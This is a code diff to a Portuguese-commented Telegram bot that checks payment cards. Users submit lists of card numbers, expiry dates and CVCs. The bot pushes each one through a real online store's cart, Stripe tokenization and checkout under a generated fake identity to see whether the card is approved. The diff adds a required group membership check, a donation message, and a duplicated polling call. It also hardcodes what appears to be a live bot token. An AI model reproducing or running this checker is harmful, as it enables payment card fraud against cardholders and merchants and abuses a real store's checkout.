@@ -9,10 +9,28 @@ import os
 from urllib.parse import urlparse, parse_qs
 
 # --- CONFIGURAÇÕES DO BOT ---
-# No Railway, você pode definir o TOKEN nas 'Variables' do projeto como TELEGRAM_TOKEN
-# Se não estiver definido lá, ele usará o valor padrão abaixo.
 TOKEN = os.getenv("TELEGRAM_TOKEN", "8806372148:AAG5KvpIAcO97IM-A00DfznguWu5eQ5qGp0")
 bot = telebot.TeleBot(TOKEN)
+
+# --- CONFIGURAÇÃO DO GRUPO OBRIGATÓRIO ---
+# O bot precisa ser ADMINISTRADOR do grupo para conseguir verificar os membros.
+CHANNEL_ID = "@DONATESCUENTAS" 
+
+# --- MENSAGEM DE APOIO ---
+SUPPORT_MESSAGE = """
+💙 **Se este bot já te ajudou...**
+
+Se este bot já te ajudou a conseguir contas, economizar tempo ou encontrar o que precisava, considere apoiar o desenvolvedor.
+
+Sua contribuição ajuda a manter o bot online, adicionar novos recursos e continuar trazendo atualizações para todos.
+
+❤️ **Apoie o desenvolvedor:** **@LIGH7YAGAMI**
+
+📢 **Entre também no nosso grupo oficial:**
+https://t.me/DONATESCUENTAS
+
+**Toda ajuda, por menor que seja, faz a diferença. Muito obrigado pelo seu apoio!** 🚀
+"""
 
 # --- CONFIGURAÇÃO DA LOJA ---
 CLIENT_ID = "353352"
@@ -36,6 +54,19 @@ APPROVED_INDICATORS = [
     "charge.succeeded",
     "stripe:success",
 ]
+
+def is_user_member(user_id):
+    """Verifica se o usuário está no grupo obrigatório"""
+    try:
+        status = bot.get_chat_member(CHANNEL_ID, user_id).status
+        # Status possíveis: 'creator', 'administrator', 'member'
+        if status in ['creator', 'administrator', 'member']:
+            return True
+        return False
+    except Exception as e:
+        # Se o bot não for admin do grupo ou o grupo for privado, pode dar erro
+        print(f"Erro ao verificar membro: {e}")
+        return False
 
 def generate_full_identity():
     first_names = ["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"]
@@ -78,7 +109,6 @@ def check_card(card_data):
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
     try:
-        # Passo 1: Inicializar Carrinho
         init_url = f"https://www.fatfreecartpro.com/ecom/gbv3.php?c=cart&ejc=2&cl={CLIENT_ID}&i={DEFAULT_ITEM_ID}&add=1&initialize=1"
         resp_init = session.get(init_url, headers={'user-agent': ua}, timeout=20)
         
@@ -89,7 +119,6 @@ def check_card(card_data):
         cart_id = id_match.group(1)
         cart_md5 = md5_match.group(1)
 
-        # Passo 2: Tokenização Stripe
         headers_stripe = {'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua}
         data_stripe = {
             'type': 'card', 'card[number]': cc_num, 'card[cvc]': cc_cvv, 'card[exp_month]': cc_month,
@@ -104,7 +133,6 @@ def check_card(card_data):
 
         pm_id = resp_stripe.json().get('id')
 
-        # Passo 3: Checkout Final
         payload_val = {
             "payment_method_id": pm_id, "cart_id": cart_id, "cart_md5": cart_md5,
             "first_name": identity['first_name'], "last_name": identity['last_name'], "email": identity['email']
@@ -128,10 +156,17 @@ def check_card(card_data):
 
 @bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
-    bot.reply_to(message, "🚀 **Bot OMPLACE Online no Railway!**\n\nEnvie sua lista no formato:\n`NUMERO|MES|ANO|CVC` (um por linha)")
+    if not is_user_member(message.from_user.id):
+        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
+        return
+    bot.reply_to(message, "🚀 **Bot OMPLACE Online!**\n\nEnvie sua lista no formato:\n`NUMERO|MES|ANO|CVC` (um por linha)")
 
 @bot.message_handler(commands=['chk'])
 def chk_cards(message):
+    if not is_user_member(message.from_user.id):
+        bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
+        return
+
     msg_text = message.text.replace('/chk', '').strip()
     if not msg_text:
         bot.reply_to(message, "❌ Use: `/chk NUMERO|MES|ANO|CVC`", parse_mode="Markdown")
@@ -157,9 +192,14 @@ def chk_cards(message):
 @bot.message_handler(func=lambda message: True)
 def auto_chk(message):
     if '|' in message.text:
+        if not is_user_member(message.from_user.id):
+            bot.reply_to(message, SUPPORT_MESSAGE, parse_mode="Markdown", disable_web_page_preview=True)
+            return
         chk_cards(message)
 
 if __name__ == "__main__":
-    print("Bot iniciado com sucesso...")
+    print("Bot iniciado com verificação de grupo...")
+    bot.infinity_polling()
+
     bot.infinity_polling()
 
